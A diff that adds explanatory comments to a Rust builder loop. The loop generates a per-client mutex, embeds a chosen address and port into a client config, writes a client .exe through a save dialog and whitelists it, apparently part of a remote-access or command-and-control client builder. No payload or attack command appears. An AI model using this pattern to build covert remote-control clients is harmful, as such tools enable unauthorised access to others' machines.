@@ -41,32 +41,33 @@ pub fn running_dir() -> PathBuf {
 }
 
 pub async fn main(settings: SettingsPointer, mut mouthpiece: BuilderMouthpiece) {
-    println!("[*] builder spawned");
+    println!("[*] builder spawned"); // this code runs in its own thread, like a mini-server
     while let Some(command) = mouthpiece.from_ui.recv().await {
         match command {
-            UiBuilderMessage::Build(builder_settings) => {
+            // takes a BuilderSettings struct as arguments
+            UiBuilderMessage::Build(builder_settings) => { // did we get asked to build?
                 println!("[*] generating mutex");
-                let mutex = mutex().unwrap();
+                let mutex = mutex().unwrap(); // randomly generate a mutex, unique per client
                 let config = ClientConfig {
-                    mutex: mutex,
-                    address: builder_settings.address,
-                    port: builder_settings.port,
+                    mutex: mutex, // the mutex we just created
+                    address: builder_settings.address, // get from arguments
+                    port: builder_settings.port, // get from arguments
                 };
                 println!("[*] opening save file dialog");
-                if let Some(output_path) = FileDialog::new()
+                if let Some(output_path) = FileDialog::new() // use the 'rfd' library to open save dialog
                     .add_filter("Executable", &["exe"])
                     .set_directory(running_dir())
                     .save_file()
                 {
-                    let out_path = output_path.to_str().unwrap();
+                    let out_path = output_path.to_str().unwrap(); // get the path the user chose
                     println!("[*] saving to:\n    {}", out_path);
 
-                    match build::main(&config, out_path).await {
+                    match build::main(&config, out_path).await { // code moved to other function
                         Ok(client) => {
-                            let mut _settings = settings.lock().await;
-                            _settings.whitelist.push(client);
+                            let mut _settings = settings.lock().await; // lock the settings variable so we can write
+                            _settings.whitelist.push(client); // add the new client to the whitelist
                             println!("[*] added mutex {} to whitelist", hex::encode(mutex));
-                            match settings::save(&*_settings).await {
+                            match settings::save(&*_settings).await { // save the settings to a file
                                 Ok(_) => {
                                     println!("[*] settings saved");
                                 }
